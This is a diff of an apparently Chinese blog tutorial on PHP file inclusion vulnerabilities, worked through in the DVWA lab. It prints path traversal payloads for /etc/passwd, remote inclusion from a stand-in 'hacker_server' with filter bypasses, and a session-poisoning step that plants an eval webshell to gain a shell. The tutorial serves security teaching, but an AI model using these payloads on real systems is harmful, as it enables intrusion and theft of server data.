@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en-us" dir="ltr">
+<html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Web应用好像包含了什么奇怪的东西= ='><title>Web安全:文件包含漏洞</title>
 
@@ -361,18 +361,18 @@
 <h3 id="远程文件包含rfiremote-file-inclusion">远程文件包含（RFI，Remote File Inclusion）</h3>
 <p>在文件包含漏洞的利用过程中，Web 应用程序下载并调用了远程文件，称作远程文件包含</p>
 <p>这些远程文件通常以 HTTP 或 FTP URI 的形式获取</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">target.xxx?file=http://hacker_server/evil.php
-</code></pre></div><h4 id="额外要求">额外要求</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">target.xxx?file=http://hacker_server/evil.php
+</span></span></code></pre></div><h4 id="额外要求">额外要求</h4>
 <p>要产生远程文件包含漏洞，在使用了特定函数和权限控制不严谨外，<code>include</code>,<code>require</code>等包含函数还必须可以加载远程文件</p>
 <p>PHP的配置文件<code>allow_url_fopen</code>和<code>allow_url_include</code>设置为<code>ON</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini"><span class="na">allow_url_fopen</span> <span class="o">=</span> <span class="s">On</span>
-<span class="na">//（是否允许打开远程文件）</span>
-<span class="na">allow_url_include</span> <span class="o">=</span> <span class="s">On</span>
-<span class="na">//（是否允许include/require远程文件）</span>
-</code></pre></div><h3 id="本地文件包含lfilocal-file-inclusion">本地文件包含（LFI，Local File Inclusion）</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini"><span class="line"><span class="cl"><span class="na">allow_url_fopen</span> <span class="o">=</span> <span class="s">On</span>
+</span></span><span class="line"><span class="cl"><span class="na">//（是否允许打开远程文件）</span>
+</span></span><span class="line"><span class="cl"><span class="na">allow_url_include</span> <span class="o">=</span> <span class="s">On</span>
+</span></span><span class="line"><span class="cl"><span class="na">//（是否允许include/require远程文件）</span>
+</span></span></code></pre></div><h3 id="本地文件包含lfilocal-file-inclusion">本地文件包含（LFI，Local File Inclusion）</h3>
 <p>在文件包含漏洞的利用过程中，Web应用程序调用了本地(服务器上)的文件，称作本地文件包含</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">target.xxx?file=/etc/hosts
-</code></pre></div><h2 id="危害">危害</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">target.xxx?file=/etc/hosts
+</span></span></code></pre></div><h2 id="危害">危害</h2>
 <ul>
 <li>
 <p>Web服务器的文件被外界浏览而导致信息泄漏</p>
@@ -387,30 +387,30 @@
 <h2 id="dvwa靶场实战">DVWA靶场实战</h2>
 <p>打开DVWA文件包含页面(<code>File Inclusion</code>)</p>
 <p>我们发现，当我们点击<code>file1.php</code>时，对应的URL的<code>page</code>的值变为<code>file1.php</code>，同时Web应用执行<code>file1.php</code>文件的源代码；</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://dvwa_ip/vulnerabilities/fi/?page=file1.php
-</code></pre></div><p>当我们点击<code>file2.php</code>时，对应的URL的<code>page</code>的值变为<code>file2.php</code>，同时Web应用执行<code>file2.php</code>文件的源代码；</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://dvwa_ip/vulnerabilities/fi/?page=file2.php
-</code></pre></div><p>当我们点击<code>file3.php</code>时，对应的URL的<code>page</code>的值变为<code>file3.php</code>，同时Web应用执行<code>file3.php</code>文件的源代码。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://dvwa_ip/vulnerabilities/fi/?page=file3.php
-</code></pre></div><p>由此可知，当我们在目标URL的<code>page</code>值后添加某个存在的文件名时，Web应用程序会相应的包含此文件。并且会将该文件(<strong>无论后缀名</strong>)作为<strong>PHP</strong>代码执行.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://dvwa_ip/vulnerabilities/fi/?page=file1.php
+</span></span></code></pre></div><p>当我们点击<code>file2.php</code>时，对应的URL的<code>page</code>的值变为<code>file2.php</code>，同时Web应用执行<code>file2.php</code>文件的源代码；</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://dvwa_ip/vulnerabilities/fi/?page=file2.php
+</span></span></code></pre></div><p>当我们点击<code>file3.php</code>时，对应的URL的<code>page</code>的值变为<code>file3.php</code>，同时Web应用执行<code>file3.php</code>文件的源代码。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://dvwa_ip/vulnerabilities/fi/?page=file3.php
+</span></span></code></pre></div><p>由此可知，当我们在目标URL的<code>page</code>值后添加某个存在的文件名时，Web应用程序会相应的包含此文件。并且会将该文件(<strong>无论后缀名</strong>)作为<strong>PHP</strong>代码执行.</p>
 <h3 id="low">low</h3>
 <p>看一下源码</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-
-<span class="c1">// The page we wish to display
-</span><span class="c1"></span><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;page&#39;</span> <span class="p">];</span>
-<span class="c1">// 通过get请求把page参数的值传入file变量
-</span><span class="c1"></span><span class="cp">?&gt;</span><span class="err"> 
-</span></code></pre></div><p>Web应用程序定义了一个变量<code>page</code>，将用户输入的值作为<code>page</code>变量的值，同时将其赋值给<code>file</code>变量。最后，Web应用程序通过对<code>file</code>变量的引用来实现文件的包含功能。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// The page we wish to display
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;page&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 通过get请求把page参数的值传入file变量
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err"> 
+</span></span></span></code></pre></div><p>Web应用程序定义了一个变量<code>page</code>，将用户输入的值作为<code>page</code>变量的值，同时将其赋值给<code>file</code>变量。最后，Web应用程序通过对<code>file</code>变量的引用来实现文件的包含功能。</p>
 <p>DVWA的low级别一般是不带有任何防护的, 没有对输入的<code>page</code>变量的值执行任何过滤措施，如果我们输入那些系统不希望用户看见任何信息的文件的文件名，并赋值给<code>page</code>变量。那么Web应用程序就会产生文件包含漏洞，系统的敏感信息就会被泄露。</p>
 <h4 id="payload1本地--利用相对路径许多个就一定会来到根目录">payload1:本地&ndash;利用相对路径(许多个<code>../</code>就一定会来到根目录)</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">../../../../../../../../../../../../../../../../etc/passwd
-</code></pre></div><h4 id="payload2本地--利用绝对路径">payload2:本地&ndash;利用绝对路径</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">/etc/passwd
-</code></pre></div><h4 id="payload3远程包含">payload3:远程包含</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">../../../../../../../../../../../../../../../../etc/passwd
+</span></span></code></pre></div><h4 id="payload2本地--利用绝对路径">payload2:本地&ndash;利用绝对路径</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/etc/passwd
+</span></span></code></pre></div><h4 id="payload3远程包含">payload3:远程包含</h4>
 <p>由于DWVA的环境，Web应用可以包含远程文件</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://server/file
-</code></pre></div><p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_21-10.png"
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://server/file
+</span></span></code></pre></div><p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_21-10.png"
 	width="1178"
 	height="212"
 	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_21-10_hu713ba8293390ba2624344f75ad4f00d0_45935_480x0_resize_box_3.png 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_21-10_hu713ba8293390ba2624344f75ad4f00d0_45935_1024x0_resize_box_3.png 1024w"
@@ -426,50 +426,50 @@
 ></p>
 <h3 id="medium">medium</h3>
 <p>直接上源码</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-
-<span class="c1">// The page we wish to display
-</span><span class="c1"></span><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;page&#39;</span> <span class="p">];</span>
-<span class="c1">// 依旧是通过get请求把page参数的值传入file变量
-</span><span class="c1">// Input validation
-</span><span class="c1"></span><span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;http://&#34;</span><span class="p">,</span> <span class="s2">&#34;https://&#34;</span> <span class="p">),</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$file</span> <span class="p">);</span>
-<span class="c1">//将file变量中的http://和https://替换为空
-</span><span class="c1"></span><span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;../&#34;</span><span class="p">,</span> <span class="s2">&#34;..</span><span class="se">\\</span><span class="s2">&#34;</span> <span class="p">),</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$file</span> <span class="p">);</span>
-<span class="c1">//同理，将file变量中的../和..\\替换为空
-</span><span class="c1">//但是捏，它只替换了一次且只替换全小写的内容，也就意味着可以通过双写或大小写绕过
-</span><span class="c1"></span><span class="cp">?&gt;</span><span class="err"> 
-</span></code></pre></div><h4 id="payload1本地--绝对路径">payload1:本地&ndash;绝对路径</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// The page we wish to display
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;page&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 依旧是通过get请求把page参数的值传入file变量
+</span></span></span><span class="line"><span class="cl"><span class="c1">// Input validation
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;http://&#34;</span><span class="p">,</span> <span class="s2">&#34;https://&#34;</span> <span class="p">),</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$file</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//将file变量中的http://和https://替换为空
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;../&#34;</span><span class="p">,</span> <span class="s2">&#34;..</span><span class="se">\\</span><span class="s2">&#34;</span> <span class="p">),</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$file</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//同理，将file变量中的../和..\\替换为空
+</span></span></span><span class="line"><span class="cl"><span class="c1">//但是捏，它只替换了一次且只替换全小写的内容，也就意味着可以通过双写或大小写绕过
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err"> 
+</span></span></span></code></pre></div><h4 id="payload1本地--绝对路径">payload1:本地&ndash;绝对路径</h4>
 <blockquote>
 <p>如果我们不使用<code>../</code>与<code>..\</code>这两个关键词，而是直接访问根目录下的用户信息文件<code>/etc/passwd</code> 。</p>
 <p>由于Web应用程序的过滤很不严谨，并没有对根目录<code>/</code>执行过滤，所以系统不能过滤我们输入的payload，那么Web应用程序将成功包含文件<code>/etc/passwd</code>，并直接暴露其源代码。
 即我们构造的payload成功的绕过了Web应用程序的防御机制。</p>
 </blockquote>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">/etc/passwd
-</code></pre></div><h4 id="payload2远程--双写绕过">payload2:远程&ndash;双写绕过</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">hthttp://tp://server/file
-</code></pre></div><h4 id="payload3远程--大小写绕过">payload3:远程&ndash;大小写绕过</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">hTtp://server/file
-</code></pre></div><h4 id="payload4远程本地皆可--使用httphttps外的协议">payload4:远程本地皆可&ndash;使用http/https外的协议</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">file:///etc/passwd
-</code></pre></div><h3 id="high">high</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/etc/passwd
+</span></span></code></pre></div><h4 id="payload2远程--双写绕过">payload2:远程&ndash;双写绕过</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">hthttp://tp://server/file
+</span></span></code></pre></div><h4 id="payload3远程--大小写绕过">payload3:远程&ndash;大小写绕过</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">hTtp://server/file
+</span></span></code></pre></div><h4 id="payload4远程本地皆可--使用httphttps外的协议">payload4:远程本地皆可&ndash;使用http/https外的协议</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">file:///etc/passwd
+</span></span></code></pre></div><h3 id="high">high</h3>
 <p>看源码= =</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-
-<span class="c1">// The page we wish to display
-</span><span class="c1">// 日常通过get请求把page参数的值传入file变量
-</span><span class="c1"></span><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;page&#39;</span> <span class="p">];</span>
-
-<span class="c1">// Input validation
-</span><span class="c1">//如果file变量的开头不是file且file的值不为include.php
-</span><span class="c1">//就提示找不到文件并退出程序
-</span><span class="c1"></span><span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nx">fnmatch</span><span class="p">(</span> <span class="s2">&#34;file*&#34;</span><span class="p">,</span> <span class="nv">$file</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$file</span> <span class="o">!=</span> <span class="s2">&#34;include.php&#34;</span> <span class="p">)</span> <span class="p">{</span>
-    <span class="c1">// This isn&#39;t the page we want!
-</span><span class="c1"></span>    <span class="k">echo</span> <span class="s2">&#34;ERROR: File not found!&#34;</span><span class="p">;</span>
-    <span class="k">exit</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="cp">?&gt;</span><span class="err"> 
-</span></code></pre></div><blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// The page we wish to display
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 日常通过get请求把page参数的值传入file变量
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;page&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Input validation
+</span></span></span><span class="line"><span class="cl"><span class="c1">//如果file变量的开头不是file且file的值不为include.php
+</span></span></span><span class="line"><span class="cl"><span class="c1">//就提示找不到文件并退出程序
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nx">fnmatch</span><span class="p">(</span> <span class="s2">&#34;file*&#34;</span><span class="p">,</span> <span class="nv">$file</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$file</span> <span class="o">!=</span> <span class="s2">&#34;include.php&#34;</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// This isn&#39;t the page we want!
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">echo</span> <span class="s2">&#34;ERROR: File not found!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
+</span></span></span></code></pre></div><blockquote>
 <p>补充一个知识点:</p>
 <p><code>fnmatch()</code> 函数的作用是根据指定的模式来匹配文件名或字符串。
 语法为：<code>fnmatch(pattern,string,flags)</code> 各个参数解释如下：</p>
@@ -502,23 +502,23 @@
 </blockquote>
 <p><code>high</code>模式中进行了更为安全的白名单过滤,因此现在包含的东西必须要以file开头了</p>
 <h4 id="payload1file协议正合我意">payload1:file协议正合我意</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">file:///etc/passwd
-</code></pre></div><hr>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">file:///etc/passwd
+</span></span></code></pre></div><hr>
 <h4 id="补充-php中文件包含函数">补充: PHP中文件包含函数</h4>
 <p>PHP中文件包含函数有以下四种</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">require</span><span class="p">()</span>
-<span class="k">require_once</span><span class="p">()</span>
-<span class="k">include</span><span class="p">()</span>
-<span class="k">include_once</span><span class="p">()</span>
-</code></pre></div><p><code>include</code>和<code>require</code>区别主要是，<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">require</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">require_once</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">include_once</span><span class="p">()</span>
+</span></span></code></pre></div><p><code>include</code>和<code>require</code>区别主要是，<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p>
 <p>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，从而确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
 <p>测试代码</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-    <span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
-    <span class="c1">//可以将include换成其他函数测试
-</span><span class="c1"></span>    <span class="k">include</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></div><p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_23-48.png"
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//可以将include换成其他函数测试
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">include</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_23-48.png"
 	width="1148"
 	height="216"
 	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_23-48_hu3bbb01bb25e975d50471ae10ec79c80f_41436_480x0_resize_box_3.png 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_23-48_hu3bbb01bb25e975d50471ae10ec79c80f_41436_1024x0_resize_box_3.png 1024w"
@@ -535,10 +535,10 @@
 <hr>
 <h4 id="payload2利用php可以包含多个文件的feature">payload2:利用PHP可以包含多个文件的feature</h4>
 <p>由上文可推断出，如果程序员在包含的时候用的<code>include</code>，前面那个<code>file</code>开头的文件存不存在都无所谓</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">file[任何内容]../../../../../../../../../../../../../../../../etc/passwd
-</code></pre></div><p>如果程序员在包含的时候用的<code>require</code>话，前面那个<code>file</code>开头的文件就<strong>必须存在!</strong></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">file[补全一个存在的文件名]../../../../../../../../../../../../../../../../etc/passwd
-</code></pre></div><h2 id="修复">修复</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">file[任何内容]../../../../../../../../../../../../../../../../etc/passwd
+</span></span></code></pre></div><p>如果程序员在包含的时候用的<code>require</code>话，前面那个<code>file</code>开头的文件就<strong>必须存在!</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">file[补全一个存在的文件名]../../../../../../../../../../../../../../../../etc/passwd
+</span></span></code></pre></div><h2 id="修复">修复</h2>
 <p>修复建议</p>
 <ul>
 <li>
@@ -562,12 +562,12 @@
 </li>
 </ul>
 <h3 id="分析">分析</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="nx">session_start</span><span class="p">();</span>
-<span class="nv">$ctfs</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ctfs&#39;</span><span class="p">];</span>
-<span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">]</span><span class="o">=</span><span class="nv">$ctfs</span><span class="p">;</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></div><p>我们发现此php会将获取到的GET型<code>ctfs</code>变量的值存入到session中，也就是可以控制session中的内容</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ctfs</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ctfs&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">]</span><span class="o">=</span><span class="nv">$ctfs</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>我们发现此php会将获取到的GET型<code>ctfs</code>变量的值存入到session中，也就是可以控制session中的内容</p>
 <p>我们通过phpinfo页面发现了session的存储路径<code>/var/lib/php/session</code></p>
 <p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_00-01.png"
 	width="837"
@@ -617,13 +617,13 @@
 ></p>
 <h3 id="利用">利用</h3>
 <p>通过上面的分析，可以知道ctfs传入的值会存储到session文件中，如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://ip/path/ctfs.php?ctfs=%3C?php%20@eval($_POST[&#39;shell&#39;])?%3E
-</code></pre></div><p>当访问以上链接的时候，Web应用会在<code>/var/lib/php/session</code>目录下存储session的值</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://ip/path/ctfs.php?ctfs=%3C?php%20@eval($_POST[&#39;shell&#39;])?%3E
+</span></span></code></pre></div><p>当访问以上链接的时候，Web应用会在<code>/var/lib/php/session</code>目录下存储session的值</p>
 <p>(同时我们的webshell也被存进去了)</p>
 <p>通过前端推测session储存的文件名<code>sess_p44b454elq0mfe2vopqvfm7m37</code></p>
 <p>通过文件包含的漏洞解析恶意代码</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://ip/path/include.php?filename=/var/lib/php/session/sess_p44b454elq0mfe2vopqvfm7m37
-</code></pre></div><p>通过webshell工具连接(方便使用你的shell)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://ip/path/include.php?filename=/var/lib/php/session/sess_p44b454elq0mfe2vopqvfm7m37
+</span></span></code></pre></div><p>通过webshell工具连接(方便使用你的shell)</p>
 <blockquote>
 <p>我本地使用的是<code>AntSword</code></p>
 </blockquote>
@@ -660,18 +660,18 @@
 </blockquote>
 <h2 id="bypass远程文件包含绕过特定后缀限制">Bypass:远程文件包含绕过特定后缀限制</h2>
 <p>测试代码</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;.html&#34;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="err">
-</span></code></pre></div><p>代码中多添加了html后缀，导致远程包含的文件也会多一个html后缀</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;.html&#34;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>代码中多添加了html后缀，导致远程包含的文件也会多一个html后缀</p>
 <p>由于URL的特性，我们在远程文件包含的时候可以做一些事情</p>
 <h3 id="绕过">?绕过</h3>
 <p>在url中，<code>?</code>后面的表示参数，所以说在文件后面加上<code>?</code>会让后面的.html变成一个参数，从而绕过特定后缀限制</p>
 <p>日志</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">192.168.109.139 - - [11/Sep/2022 11:52:00] &#34;GET /1.html?.html HTTP/1.0&#34; 200 -
-</code></pre></div><h3 id="绕过-1">#绕过</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">192.168.109.139 - - [11/Sep/2022 11:52:00] &#34;GET /1.html?.html HTTP/1.0&#34; 200 -
+</span></span></code></pre></div><h3 id="绕过-1">#绕过</h3>
 <p>URL中，<code>#</code>号是客户端参数,用于网页位置定位,对于Bypass来讲，重要的是<code>#</code>号之后的参数<strong>不会传入到服务端</strong></p>
 <p>日志</p>
